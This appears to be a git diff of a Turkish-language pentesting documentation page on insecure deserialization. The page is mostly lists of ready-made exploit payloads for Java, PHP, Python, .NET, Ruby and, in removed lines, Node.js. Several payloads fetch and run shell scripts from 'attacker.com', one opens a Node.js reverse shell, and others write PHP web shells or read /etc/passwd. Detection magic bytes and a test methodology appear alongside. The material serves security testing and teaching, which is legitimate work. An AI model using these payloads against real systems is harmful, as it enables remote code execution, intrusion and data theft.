@@ -19,61 +19,83 @@ export default function DeserializationPage() {
         </div>
         <h1 className="text-4xl font-bold text-foreground mb-4">Insecure Deserialization</h1>
         <p className="text-lg text-muted-foreground leading-relaxed">
-          Güvenilmeyen veriyi deserialize etmek RCE, DoS ve authentication bypass&apos;a yol açabilir.
-          Java, PHP, Python, Ruby ve .NET ortamlarında yaygındır.
+          Güvenilmeyen verilerin deserialize edilmesi sonucu oluşan zafiyet. Remote Code Execution (RCE),
+          authentication bypass ve denial of service&apos;e yol açabilir.
         </p>
       </motion.div>
 
-      <Callout type="danger" title="Kritik Risk">
-        Insecure deserialization genellikle Remote Code Execution (RCE) ile sonuçlanır.
-        Bu zafiyetler kritik öncelikle ele alınmalıdır.
+      <Callout type="warning" title="Kritik Seviye">
+        Insecure deserialization genelde P1/Critical çünkü doğrudan RCE&apos;ye yol açar.
+        Java, PHP, Python, .NET ve Ruby&apos;de yaygındır.
       </Callout>
 
       <motion.section variants={fadeIn} className="mt-12">
         <h2 className="text-2xl font-semibold text-foreground mb-4">Java Deserialization</h2>
+        <p className="text-muted-foreground mb-4">
+          Java ObjectInputStream kullanan uygulamalar hedef alınır. ysoserial aracı ile
+          gadget chain&apos;ler oluşturulur.
+        </p>
         <PayloadList
-          title="Java Serial Payloads"
-          initialShow={5}
+          title="ysoserial Payloads"
+          initialShow={8}
           payloads={[
-            { code: `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...`, note: "Base64 encoded Java serialized object - ysoserial ile oluştur" },
-            { code: `AC ED 00 05 (hex header)`, note: "Java serialized object magic bytes" },
-            { code: `java -jar ysoserial.jar CommonsCollections1 'whoami' | base64`, note: "ysoserial ile RCE payload" },
-            { code: `java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh|bash'`, note: "Reverse shell payload" },
-            { code: `java -jar ysoserial.jar CommonsCollections6 'wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m'`, note: "Malware download" },
-            { code: `java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net'`, note: "Blind detection - DNS callback" },
-            { code: `java -jar ysoserial.jar JRMPClient 'attacker.com:1099'`, note: "JRMP listener callback" },
-            { code: `java -jar ysoserial.jar Jdk7u21 'calc.exe'`, note: "JDK 7u21 gadget chain" },
+            { code: `java -jar ysoserial.jar CommonsCollections1 'id' | base64`, note: "Apache Commons Collections 3.1" },
+            { code: `java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh|bash'`, note: "CC5 - reverse shell" },
+            { code: `java -jar ysoserial.jar CommonsCollections6 'wget attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell'`, note: "CC6 zinciri" },
+            { code: `java -jar ysoserial.jar CommonsCollections7 'ping -c 3 attacker.com'`, note: "CC7 - OOB tespit" },
+            { code: `java -jar ysoserial.jar CommonsCollections10 'id'`, note: "CC10 - yeni versiyonlar" },
+            { code: `java -jar ysoserial.jar CommonsCollections13 'id'`, note: "CC13 - son zincirler" },
+            { code: `java -jar ysoserial.jar Spring1 'touch /tmp/pwned'`, note: "Spring Framework gadget" },
+            { code: `java -jar ysoserial.jar Hibernate1 'id'`, note: "Hibernate ORM gadget" },
+            { code: `java -jar ysoserial.jar JBossInterceptors1 'id'`, note: "JBoss gadget" },
+            { code: `java -jar ysoserial.jar Jdk7u21 'id'`, note: "JDK 7u21 native gadget" },
+            { code: `java -jar ysoserial.jar URLDNS http://attacker.burpcollaborator.net`, note: "DNS lookup - sadece tespit" },
+          ]}
+        />
+      </motion.section>
+
+      <motion.section variants={fadeIn} className="mt-12">
+        <h2 className="text-2xl font-semibold text-foreground mb-4">Java Magic Bytes</h2>
+        <Callout type="info" title="Tespit">
+          Java serialized object&apos;ler &quot;ac ed 00 05&quot; (hex) veya &quot;rO0AB&quot; (base64) ile başlar.
+          HTTP request/response&apos;larda bu pattern&apos;leri arayın.
+        </Callout>
+        <PayloadList
+          title="Detection Patterns"
+          initialShow={6}
+          payloads={[
+            { code: `ac ed 00 05`, note: "Java serialized object hex imzası" },
+            { code: `rO0AB`, note: "Base64 kodlanmış Java nesnesi" },
+            { code: `Content-Type: application/x-java-serialized-object`, note: "Java serialization content type" },
+            { code: `H4sIAAAA`, note: "Base64 gzip Java nesnesi" },
+            { code: `.class dosyalarında ObjectInputStream.readObject()`, note: "Kaynak kod incelemesi" },
+            { code: `XMLDecoder, XStream, Kryo, Hessian`, note: "Alternatif serialization kütüphaneleri" },
           ]}
         />
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
         <h2 className="text-2xl font-semibold text-foreground mb-4">PHP Deserialization</h2>
+        <p className="text-muted-foreground mb-4">
+          PHP&apos;de unserialize() fonksiyonu ile magic method&apos;lar (__wakeup, __destruct, __toString)
+          tetiklenerek RCE elde edilir.
+        </p>
         <PayloadList
           title="PHP Object Injection"
           initialShow={8}
           payloads={[
-            { code: `O:8:"stdClass":1:{s:4:"test";s:5:"value";}`, note: "Temel PHP serialized object" },
-            { code: `a:2:{i:0;s:4:"test";i:1;s:5:"value";}`, note: "PHP serialized array" },
-            { code: `O:14:"Authentication":1:{s:7:"isAdmin";b:1;}`, note: "Auth bypass - isAdmin=true" },
-            { code: `O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}`, note: "Role manipulation" },
-            { code: `O:8:"SomeClass":1:{s:4:"file";s:11:"/etc/passwd";}`, note: "__destruct ile file read" },
-            { code: `O:8:"LogClass":1:{s:4:"file";s:25:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET['cmd']); ?>";}`, note: "File write RCE" },
-            { code: `O:7:"Archive":1:{s:4:"path";s:18:"phar://./shell.jpg";}`, note: "Phar deserialization" },
-            { code: `php://filter/convert.base64-decode/resource=data://text/plain;base64,PAYLOAD`, note: "Filter chain RCE" },
-            { code: `a:2:{i:0;O:9:"Exception":1:{s:7:"message";s:7:"pwned!!";}i:1;s:4:"test";}`, note: "Exception object" },
-          ]}
-        />
-
-        <PayloadList
-          title="PHPGGC Payloads"
-          initialShow={5}
-          payloads={[
-            { code: `./phpggc Laravel/RCE1 system 'id'`, note: "Laravel RCE" },
-            { code: `./phpggc Symfony/RCE4 exec 'whoami'`, note: "Symfony RCE" },
-            { code: `./phpggc Monolog/RCE1 system 'cat /etc/passwd'`, note: "Monolog RCE" },
-            { code: `./phpggc Guzzle/FW1 /var/www/html/shell.php /tmp/shell.php`, note: "Guzzle file write" },
-            { code: `./phpggc Doctrine/FW1 /tmp/shell.php '<?php system($_GET["c"]); ?>'`, note: "Doctrine file write" },
+            { code: `O:8:"stdClass":1:{s:4:"test";s:4:"data";}`, note: "Temel PHP serialized nesne" },
+            { code: `O:14:"DatabaseExport":1:{s:8:"filename";s:11:"/etc/passwd";}`, note: "Deserialization ile dosya okuma" },
+            { code: `O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:1;}`, note: "Yetki yükseltme" },
+            { code: `a:2:{i:0;s:4:"test";i:1;O:4:"Evil":1:{s:3:"cmd";s:2:"id";}}`, note: "İç içe nesne içeren dizi" },
+            { code: `O:+4:"User":1:{s:4:"role";s:5:"admin";}`, note: "+ ile sınıf adı filtre bypass" },
+            { code: `O:4:"User":1:{S:4:"\\72ole";s:5:"admin";}`, note: "Hex kodlanmış özellik adı" },
+            { code: `C:11:"ArrayObject":37:{x:i:0;a:1:{s:4:"role";s:5:"admin";};m:a:0:{}}`, note: "Özel serializable sınıf" },
+            { code: `phpggc Laravel/RCE1 system id`, note: "PHPGGC - Laravel gadget zinciri" },
+            { code: `phpggc Symfony/RCE4 exec 'id'`, note: "PHPGGC - Symfony gadget" },
+            { code: `phpggc WordPress/RCE2 system id`, note: "PHPGGC - WordPress gadget" },
+            { code: `phpggc Magento/SQLI1 'SELECT version()'`, note: "PHPGGC - Magento SQL injection" },
+            { code: `phar://malicious.phar`, note: "Phar deserialization - dosya işlemleri unserialize tetikler" },
           ]}
         />
       </motion.section>
@@ -81,28 +103,15 @@ export default function DeserializationPage() {
       <motion.section variants={fadeIn} className="mt-12">
         <h2 className="text-2xl font-semibold text-foreground mb-4">Python Deserialization</h2>
         <PayloadList
-          title="Python Pickle"
-          initialShow={5}
+          title="Pickle / PyYAML Payloads"
+          initialShow={6}
           payloads={[
-            { code: `import pickle
-import os
-class Evil:
-    def __reduce__(self):
-        return (os.system, ('whoami',))
-pickle.dumps(Evil())`, note: "__reduce__ ile RCE" },
-            { code: `cos
-system
-(S'id'
-tR.`, note: "Raw pickle opcode - id command" },
-            { code: `(cos
-system
-S'curl attacker.com/shell.sh|bash'
-o.`, note: "Reverse shell pickle" },
-            { code: `import pickle, base64
-payload = b"cos\\nsystem\\n(S'id'\\ntR."
-print(base64.b64encode(payload).decode())`, note: "Base64 encoded pickle" },
-            { code: `import yaml
-yaml.load('!!python/object/apply:os.system ["id"]')`, note: "PyYAML RCE - unsafe load" },
+            { code: `import pickle, os; pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")`, note: "Temel pickle RCE" },
+            { code: `import yaml; yaml.load("!!python/object/apply:os.system ['id']")`, note: "PyYAML güvensiz yükleme" },
+            { code: `import yaml; yaml.load("!!python/object/new:subprocess.check_output [['id']]")`, note: "PyYAML subprocess çalıştırma" },
+            { code: `gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==`, note: "Base64 pickle payload" },
+            { code: `\\x80\\x04\\x95...`, note: "Ham pickle byte'ları - protokol 4" },
+            { code: `import jsonpickle; jsonpickle.decode('{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}')`, note: "jsonpickle RCE" },
           ]}
         />
       </motion.section>
@@ -110,14 +119,15 @@ yaml.load('!!python/object/apply:os.system ["id"]')`, note: "PyYAML RCE - unsafe
       <motion.section variants={fadeIn} className="mt-12">
         <h2 className="text-2xl font-semibold text-foreground mb-4">.NET Deserialization</h2>
         <PayloadList
-          title=".NET Payloads"
-          initialShow={5}
+          title=".NET Gadget Chains"
+          initialShow={6}
           payloads={[
-            { code: `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"`, note: "BinaryFormatter gadget" },
-            { code: `ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"`, note: "WindowsIdentity gadget" },
-            { code: `ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"`, note: "Json.Net gadget" },
-            { code: `ysoserial.exe -g PSObject -f BinaryFormatter -c "powershell -e BASE64"`, note: "PowerShell execution" },
-            { code: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`, note: "Json.Net TypeNameHandling RCE" },
+            { code: `ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc"`, note: "TypeConfuseDelegate zinciri" },
+            { code: `ysoserial.net -g WindowsIdentity -f Json.Net -c "calc"`, note: "Json.NET deserialization" },
+            { code: `ysoserial.net -g PSObject -f BinaryFormatter -c "calc"`, note: "BinaryFormatter zinciri" },
+            { code: `ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c ping attacker.com"`, note: "OOB tespit" },
+            { code: `ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c whoami"`, note: "Activity zinciri" },
+            { code: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}}`, note: "Json.NET TypeNameHandling istismarı" },
           ]}
         />
       </motion.section>
@@ -125,46 +135,24 @@ yaml.load('!!python/object/apply:os.system ["id"]')`, note: "PyYAML RCE - unsafe
       <motion.section variants={fadeIn} className="mt-12">
         <h2 className="text-2xl font-semibold text-foreground mb-4">Ruby Deserialization</h2>
         <PayloadList
-          title="Ruby Marshal"
+          title="Ruby Marshal Payloads"
           initialShow={4}
           payloads={[
-            { code: `Marshal.dump(ERB.new("<%= system('id') %>").result)`, note: "ERB template RCE" },
-            { code: `Gem::Requirement.new(Gem::DependencyList.new.tap{|x| x.instance_variable_set(:@specs,[Gem::Source.new("| id")])})`, note: "Gem gadget chain" },
-            { code: `require 'yaml'
-YAML.load('--- !ruby/object:Gem::Installer\ni: x')`, note: "YAML unsafe load" },
-            { code: `!!ruby/object:Gem::Requirement
-requirements:
-  !ruby/object:Gem::DependencyList
-  specs:
-  - !ruby/object:Gem::Source
-    current_fetch_uri: "| id"`, note: "YAML RCE payload" },
+            { code: `Marshal.dump(ERB.new("<%= system('id') %>"))`, note: "Marshal ile ERB template injection" },
+            { code: `Gem::Installer.new.spec.tap{|s| s.name="a"; s.version="0"; s.platform="ruby"; s.authors=["a"]; s.summary="a"; s.instance_variable_set(:@loaded_from,"|id")}`, note: "Gem::Installer gadget" },
+            { code: `YAML.load("--- !ruby/object:Gem::Requirement\\nrequirements:\\n- !ruby/object:Gem::DependencyList\\n  specs:\\n  - !ruby/object:Gem::Source\\n    uri: |\\n      id")`, note: "YAML güvensiz yükleme" },
+            { code: `\\x04\\x08...`, note: "Ham Marshal byte'ları" },
           ]}
         />
       </motion.section>
 
-      <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Node.js Deserialization</h2>
-        <PayloadList
-          title="Node.js Payloads"
-          initialShow={5}
-          payloads={[
-            { code: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`, note: "node-serialize RCE" },
-            { code: `{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /etc/passwd').toString()}()"}`, note: "Sync execution" },
-            { code: `_$$ND_FUNC$$_function(){var net=require('net'),sh=require('child_process').spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,'attacker.com',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}()`, note: "Reverse shell" },
-            { code: `{"exploit":"_$$ND_FUNC$$_require('child_process').exec('curl attacker.com/shell.sh|bash')"}`, note: "Curl based reverse shell" },
-          ]}
-        />
-      </motion.section>
-
-      <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Tespit İpuçları</h2>
-        <Callout type="info" title="Magic Bytes">
-          Java: AC ED 00 05 veya rO0AB (base64)
-          .NET BinaryFormatter: 00 01 00 00 00 FF FF FF FF
-          PHP: O: veya a: ile başlar
-          Python Pickle: 80 04 95 veya cos, cposix
-        </Callout>
-      </motion.section>
+      <Callout type="tip" title="Test Metodolojisi">
+        1. Serialized data tespit edin (cookies, hidden fields, API params){"\n"}
+        2. Format belirleyin (Java, PHP, Python, .NET, Ruby){"\n"}
+        3. Önce URLDNS/sleep ile zafiyet doğrulayın{"\n"}
+        4. Gadget chain ile RCE elde edin{"\n"}
+        5. ysoserial, phpggc, marshalsec araçlarını kullanın
+      </Callout>
 
       <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
         <Link href="/docs/web/xxe" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
